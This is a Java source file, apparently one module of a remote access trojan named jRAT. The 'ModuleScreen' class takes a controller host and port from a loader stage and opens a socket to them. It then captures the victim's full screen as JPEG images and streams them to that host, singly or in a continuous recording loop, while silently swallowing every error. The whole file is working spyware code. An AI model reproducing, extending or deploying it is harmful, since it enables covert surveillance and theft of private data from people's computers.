package jRAT.modules;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.UnsupportedEncodingException;
import java.net.Socket;
import java.util.Date;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.locks.ReentrantLock;

import javax.imageio.ImageIO;

public class ModuleScreen {

    private final static AtomicBoolean RECORDING   = new AtomicBoolean(false);
    private final static AtomicLong SLEEP_MS       = new AtomicLong(250);
    private final static ReentrantLock SOCKET_LOCK = new ReentrantLock();
    
    private static String HOST                     = null;
    private static Integer PORT                    = null;

    private static Socket socket                   = null;
    private static DataInputStream socketInput     = null;
    private static DataOutputStream socketOutput   = null;

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void init(Class stage) throws Exception
    {
        HOST = (String)  stage.getMethod("getHost", new Class[0]).invoke(null, new Object[0]);
        PORT = (Integer) stage.getMethod("getPort", new Class[0]).invoke(null, new Object[0]);
    }
    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] showModuleInfo() throws UnsupportedEncodingException
    {
        StringBuilder moduleInfo = new StringBuilder();
        moduleInfo.append("\n*** MODULE: Screen ***\n\n");
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "capture",  ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "record",   ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "stop",     ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "status",   ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "getsleep", ""));
        moduleInfo.append(String.format("METHOD: %-40s | PARAMS: %s\n", "setsleep", "milliseconds"));
        return moduleInfo.toString().getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static boolean isBackgroundMethod(String methodName)
    {
        switch (methodName)
        {
            case "capture": return true;
            case "record":  return true;
            default:        return false;
        }
    }

    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */
    /* ---------------------------------------------------------------------------------------------------------- */

    private static void open()
    {
        try
        {
            if (socket == null)
            {
                socket       = new Socket(HOST, PORT);
                socketInput  = new DataInputStream(socket.getInputStream());
                socketOutput = new DataOutputStream(socket.getOutputStream());
                socketOutput.writeUTF("ModuleScreen");
            }
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    private static void close()
    {
        try
        {
            if (socket != null)
            {
                socketOutput.writeUTF("CLOSE");
                socketInput.close();
                socketOutput.close();
                socket.close();
                socket = null;
            }
        }
        catch (Exception ex) {}
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] stop() throws UnsupportedEncodingException
    {
        RECORDING.set(false);
        return new String("Stopped!").getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] status() throws UnsupportedEncodingException
    {
        if (RECORDING.get())
            return new String("Screen capture in progress!").getBytes("UTF-8");
        else
            return new String("No capture in progress!").getBytes("UTF-8");
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */
    
    public static byte[] getsleep(String sleep) throws UnsupportedEncodingException
    {
        StringBuilder response = new StringBuilder();
        response.append("Sleep between screenshots is: ");
        response.append(String.valueOf(SLEEP_MS));
        response.append(" milliseconds!");
        return response.toString().getBytes("UTF-8");
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static byte[] setsleep(String milliseconds) throws UnsupportedEncodingException
    {
        try
        {
            SLEEP_MS.set(Long.parseLong(milliseconds));
            return new String("Sleep between screenshots set to " + milliseconds + " ms!").getBytes("UTF-8");
        }
        catch (NumberFormatException ex)
        {
            return new String("Could not set sleep => Invalid number format!").getBytes("UTF-8");
        }
    }
    
    /* ---------------------------------------------------------------------------------------------------------- */

    public static void capture()
    {
        if (socket == null) { open(); }

        byte[] rawImageData = null;
        ByteArrayOutputStream output = null;
        try
        {
            Robot robot = new Robot();
            Rectangle screenRectangle = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage image = robot.createScreenCapture(screenRectangle);            
            output = new ByteArrayOutputStream();
            ImageIO.write(image, "jpg", output);
            rawImageData = output.toByteArray();

            SOCKET_LOCK.lock();
            
            if (rawImageData == null)
                socketOutput.writeUTF("NOK");
            else
            {
                socketOutput.writeUTF("OK");
                socketOutput.writeUTF("Screenshot_" + new Date().toString());
                socketOutput.writeLong(rawImageData.length);
                socketOutput.write(rawImageData);
                socketOutput.flush();
            }
        }
        catch (Exception ex) {}
        finally { SOCKET_LOCK.unlock(); }

        if (!RECORDING.get())
            close();
    }

    /* ---------------------------------------------------------------------------------------------------------- */

    public static void record()
    {
        RECORDING.set(true);
        while (RECORDING.get())
        {
            capture();
            try { Thread.sleep(SLEEP_MS.get()); }
            catch (InterruptedException ex) {}
        }
        close();
    }

    /* ---------------------------------------------------------------------------------------------------------- */
}
